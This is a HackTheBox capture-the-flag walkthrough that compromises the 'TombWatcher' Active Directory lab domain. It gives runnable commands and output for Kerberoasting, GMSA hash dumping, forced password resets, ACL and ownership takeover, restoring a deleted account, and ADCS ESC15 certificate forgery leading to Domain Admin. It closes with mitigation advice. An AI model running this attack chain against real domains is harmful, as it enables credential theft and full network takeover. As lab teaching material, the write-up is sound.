---
title: "Tombwatcher - HackTheBox"
date: 2025-10-24 00:00:00 +0800
categories: [Walkthroughs]
description: "Seasonal Machine — Windows [Medium]"
tags: [HTB, ADCS ESC15, Deleted User]
image: /assets/img/favicons/tombwatcher-htb/1.png
---

### Introduction
[**TombWatcher**](https://app.hackthebox.com/machines/664) is a Medium-difficulty Active Directory machine on HackTheBox, featuring Windows Server 2019 with Kerberos, LDAP, and ADCS services. The attack path involves initial enumeration with provided credentials, Active Directory abuse via BloodHound-guided privilege chains, Kerberoasting for user escalation, GMSA exploitation, ACL manipulation for user access, and ADCS ESC15 (CVE-2024-49019) for Domain Admin privileges. This walkthrough synthesizes key techniques from multiple sources for a streamlined, reproducible approach.

- IP Address: `10.10.11.72`
- Domain: `tombwatcher.htb`
- Provided Credentials: `henry:H3nry_987TGV!`

#### TL;DR
> 1. **Initial Access**: Validated provided credentials and enumerated AD via BloodHound.
> 2. **First Privilege Escalation**: Kerberoasted `alfred` (WriteSPN abuse) to obtain creds.
> 3. **Sensitive Information Disclosure**: Added `alfred` to `INFRASTRUCTURE` group, dumped `GMSA` (ANSIBLE_DEV$) AES256 key.
> 4. **Second Privilege Escalation**: Used `GMSA` to reset sam password, then abused ACL to takeover `john` (FullControl, password reset).
> **Third Privilege Escalation**: As `john`, exploited `ADCS ESC15` (CVE-2024-49019) via vulnerable WebServer template; restored `cert_admin` from AD Recycle Bin.
> 5. **Domain Takeover**: As `cert_admin`, forged a certificate for Administrator using cert_admin.pfx, authenticated with NT hash for Domain Admin access.

### Reconnaissance
#### i. Host Setup
Add the domain to `/etc/hosts`:
```shell
echo "10.10.11.72 tombwatcher.htb dc01.tombwatcher.htb" | sudo tee -a /etc/hosts
```

#### ii. Nmap Scan
Perform a full port scan:
```shell
nmap -A -p- -T4 -v 10.10.11.72
```

**Key findings:**

- Ports: 53 (DNS), 80 (IIS HTTP), 88 (Kerberos), 135/139/445 (RPC/SMB), 389/636 (LDAP/LDAPS), 464 (kpasswd), 5985 (WinRM).
OS: Windows Server 2019 Standard.
Domain: tombwatcher.htb (DC: dc01.tombwatcher.htb).
Clock skew detected (~4 hours); sync with ntpdate 10.10.11.72 if needed.

#### iii. Initial Credential Testing
Validate creds with NetExec:
```shell
nxc smb 10.10.11.72 -u henry -p 'H3nry_987TGV!' -d tombwatcher.htb
```
> SMB signing required; access denied to shares/WinRM, but creds valid for enumeration.

### Active Directory Enumeration with BloodHound
Collect AD data:
```shell
bloodhound-python -d tombwatcher.htb -u henry -p 'H3nry_987TGV!' -gc dc01.tombwatcher.htb -c all -ns 10.10.11.72
```

Import into BloodHound GUI. Key paths from `henry`:

- `henry` has **WriteSPN** on `alfred` (Kerberoastable).
![1](/assets/img/favicons/tombwatcher-htb/2.png)

- `alfred` has **AddSelf** on `INFRASTRUCTURE` group.
![1](/assets/img/favicons/tombwatcher-htb/2-2.png)

- `INFRASTRUCTURE` has **ReadGMSAPassword** on `ANSIBLE_DEV$` (GMSA).
![1](/assets/img/favicons/tombwatcher-htb/3.png)

- `ANSIBLE_DEV$` has **ForceChangePassword** on `sam`.
![1](/assets/img/favicons/tombwatcher-htb/4.png)

- `sam` has **WriteOwner** on `john` (ACL takeover).
![1](/assets/img/favicons/tombwatcher-htb/5.png)

### Initial Foothold: Kerberoasting Alfred
Exploit WriteSPN (or use web backup creds directly). Request TGS:
```shell
┌──(kali㉿kali)-[/opt/tools/windows/targetedKerberoast]
└─$ targetedKerberoast -v -d tombwatcher.htb -u henry -p 'H3nry_987TGV!' --request-user 'alfred'
[*] Starting kerberoast attacks
[*] Attacking user (alfred)
[+] Printing hash for (Alfred)
$krb5tgs$23$*Alfred$TOMBWATCHER.HTB$tombwatcher.htb/Alfred*$df223a219a24...<SNIP>...3b0d09
```

Crack hash:
```shell
┌──(root㉿kali)-[/home/kali/HTB/TombWatcher]
└─# john alfred.hash -w=/usr/share/wordlists/rockyou.txt 
```
![1](/assets/img/favicons/tombwatcher-htb/FoxitPDFEditor_tOw8Nf07hi.png)
- Password: [REDACTED] 
- Validate:
```shell
nxc smb 10.10.11.72 -u alfred -p [REDACTED] -d tombwatcher.htb
```

### User Escalation: GMSA and ACL Abuse
#### i. Add Alfred to INFRASTRUCTURE
```bash
┌──(root㉿kali)-[/home/kali/HTB/TombWatcher]
└─# bloodyAD --host 10.10.11.72 -d 'tombwatcher.htb' -u alfred -p '[REDACTED] ' add groupMember 'INFRASTRUCTURE' alfred
[+] alfred added to INFRASTRUCTURE
```

#### ii. Dump GMSA Password for ANSIBLE_DEV$
```shell
┌──(root㉿kali)-[/home/kali/HTB/TombWatcher]
└─# nxc ldap 10.10.11.72 -u alfred -p 'basketball' --gmsa
LDAP        10.10.11.72     389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:tombwatcher.htb)
LDAPS       10.10.11.72     636    DC01             [+] tombwatcher.htb\alfred:basketball 
LDAPS       10.10.11.72     636    DC01             [*] Getting GMSA Passwords
LDAPS       10.10.11.72     636    DC01             Account: ansible_dev$      NTLM: [HASH_REDACTED]   PrincipalsAllowedToReadPassword: Infrastructure
```

#### iii. Change Sam's Password

```shell
┌──(root㉿kali)-[/home/kali/HTB/TombWatcher]
└─# bloodyAD --host 10.10.11.72 -d 'tombwatcher.htb' -u 'ansible_dev$' -p ':ecb4146b3f99e6bbf06ca896f504227c' set password SAM 'Cyb3rtr0n@123'    
[+] Password changed successfully!
```

#### ⅳ. Takeover John via Ownership/ACL
- Set ownership:

```shell
┌──(root㉿kali)-[/home/kali/HTB/TombWatcher]
└─# impacket-owneredit -action write -new-owner 'SAM' -target 'JOHN' TOMBWATCHER.HTB/SAM:'Cyb3rtr0n@123'  
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Current owner information below
[*] - SID: S-1-5-21-1392491010-1358638721-2126982587-512
[*] - sAMAccountName: Domain Admins
[*] - distinguishedName: CN=Domain Admins,CN=Users,DC=tombwatcher,DC=htb
[*] OwnerSid modified successfully!
```

- Grant FullControl:

```shell               
┌──(root㉿kali)-[/home/kali/HTB/TombWatcher]
└─# impacket-dacledit -action write -rights FullControl -principal 'SAM' -target 'JOHN' TOMBWATCHER.HTB/SAM:'Cyb3rtr0n@123'  
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] DACL backed up to dacledit-20250817-234104.bak
[*] DACL modified successfully!
```

- Change password:

```shell
┌──(root㉿kali)-[/home/kali/HTB/TombWatcher]
└─# bloodyAD --host 10.10.11.72 -d 'tombwatcher.htb' -u 'SAM' -p 'Cyb3rtr0n@123' set password JOHN 'Cyb3rtr0n@123'
[+] Password changed successfully!
```

- Clean up ACL:

```shell
impacket-dacledit -action remove -rights FullControl -principal sam -target john 'tombwatcher.htb/sam:Test1234.' -dc-ip 10.10.11.72
```

- Shell as john:

```shell
┌──(kali㉿kali)-[~/HTB/TombWatcher]
└─$ evil-winrm -i 10.10.11.72 -u JOHN -p 'Cyb3rtr0n@123'
```
![1](/assets/img/favicons/tombwatcher-htb/8.png)

> user Flag: C:\Users\john\Desktop\user.txt

### Retrieve cert_admin
Collecting additional BloodHound data gave us quick and interesting data about a deleted object!
![1](/assets/img/favicons/tombwatcher-htb/9.png)

Further enumeration with powershell:

```powershell
*Evil-WinRM* PS C:\Users\john\Desktop> Get-DomainObjectAcl -Search "CN=Configuration,DC=tombwatcher,DChtb" | ? { $_.SecurityIdentifier -like "*-1111" }
```
![1](/assets/img/favicons/tombwatcher-htb/9-1.png)

```powershell
*Evil-WinRM* PS C:\Users\john\Desktop> Get-ADObject -ldapfilter "(&(isDeleted=TRUE))" -IncludeDeletedObjects
```
![1](/assets/img/favicons/tombwatcher-htb/11.png)

#### Findings

- The deleted account name is **`cert_admin`** (we see multiple tombstones with different GUIDs).
- Those are **tombstone objects** → AD keeps them around (by default 180 days) before garbage collecting.
- That matches BloodHound: the orphaned SID (`…-1111`) belonged to `cert_admin`.

#### Why this matters

- `cert_admin` had **Enroll rights** on the **WebServer certificate template**.
- Since the user is deleted, those rights are **dangling** (no one can use them directly).
- But we now know the **deleted account’s name and purpose** and it was likely an account specifically created for **Certificate Services administration**.

```powershell
*Evil-WinRM* PS C:\Users\john\Documents> Restore-ADObject -Identity "c1f1f0fe-df9c-494c-bf05-0679e181b358"
*Evil-WinRM* PS C:\Users\john\Documents> Get-ADUser -Identity cert_admin

DistinguishedName : CN=cert_admin,OU=ADCS,DC=tombwatcher,DC=htb
Enabled           : True
GivenName         : cert_admin
Name              : cert_admin
ObjectClass       : user
ObjectGUID        : c1f1f0fe-df9c-494c-bf05-0679e181b358
SamAccountName    : cert_admin
SID               : S-1-5-21-1392491010-1358638721-2126982587-1110
Surname           : cert_admin
UserPrincipalName :
```

- We can confirm that the account is retrieved with NetExec:

```bash
┌──(root㉿kali)-[/home/kali/HTB/TombWatcher]
└─# nxc smb 10.10.11.72 -u JOHN -p 'Cyb3rtr0n@123' --rid-brute | grep cert_admin        
SMB                      10.10.11.72     445    DC01             1110: TOMBWATCHER\cert_admin (SidTypeUser)
```

- Change `cert_admin`'s password:

```shell
┌──(root㉿kali)-[/home/kali/HTB/TombWatcher]
└─# bloodyAD --host 10.10.11.72 -d 'tombwatcher.htb' -u JOHN -p 'Cyb3rtr0n@123' set password cert_admin 'Cyb3rtr0n@123'
[+] Password changed successfully!
```

### Privilege Escalation: ADCS ESC15
As `cert_admin`, enumerate templates:
```bash
┌──(root㉿kali)-[/home/kali/HTB/TombWatcher]
└─# certipy-ad find -u cert_admin -p 'Cyb3rtr0n@123' -dc-ip 10.10.11.72 -vulnerable
```
![1](/assets/img/favicons/tombwatcher-htb/13.png)
![1](/assets/img/favicons/tombwatcher-htb/14.png)

> WebServer template vulnerable: Enrollee supplies subject + Schema v1 (ESC15).


- Exploit ESC15 (inject Certificate Request Agent policy), request a certificate on behalf of `Administrator`:
```bash
┌──root㉿kali)-[/home/kali/HTB/TombWatcher]
└─# certipy-ad req -u cert_admin@tombwatcher.htb -p 'Cyb3rtr0n@123' -ca 'tombwatcher-CA-1' -target-ip 10.10.11.72 -template WebServer -upn administrator@tombwatcher.htb -application-policies 'Client Authentication'
```
We obtained administrator.pfx successfully!

- Authenticate with certificate and open ldap_shell:
```shell
certipy-ad auth -pfx administrator.pfx -dc-ip 10.10.11.72 -ldap_shell
```
![1](/assets/img/favicons/tombwatcher-htb/15.png)

### DCSync
![1](/assets/img/favicons/tombwatcher-htb/16.png)

### Retrive root Flag!
![1](/assets/img/favicons/tombwatcher-htb/17.png)

> root Flag: C:\Users\Administrator\Desktop\root.txt

### Recommended Migitaions

- **Immediate / High priority**
    - Restrict the WebServer and other high-risk templates: remove requester-supplied subject/Schema v1 and require CA approval.
    - Enforce LDAP signing & channel binding; require LDAPS where possible.

- **ACL & privilege hygiene**
    - Audit AD ACLs and remove risky rights from non-admins: WriteSPN, AddMember/AddSelf, ReadGMSAPassword, ForceChangePassword, WriteOwner, GenericAll.
    - Limit membership changes for privileged groups (e.g., INFRASTRUCTURE); require approval/JIT for membership elevation.
    - Narrow PrincipalsAllowedToRetrievePassword for GMSAs to only intended computer/service accounts.

- **Identity & account controls**
    - Rotate and enforce complex credentials for service and admin accounts; avoid password reuse.
    - Put Domain Admins and highly privileged accounts into Protected Users.

- **ACL takeover & restore hardening**
    - Restrict WriteOwner and DACL modification rights to a small, audited admin role.
    - Restrict and monitor AD Recycle Bin restores; require approval for restoring objects with privileged SIDs.


> *hope you enjoyed this writeup! Happy Hacking :)*
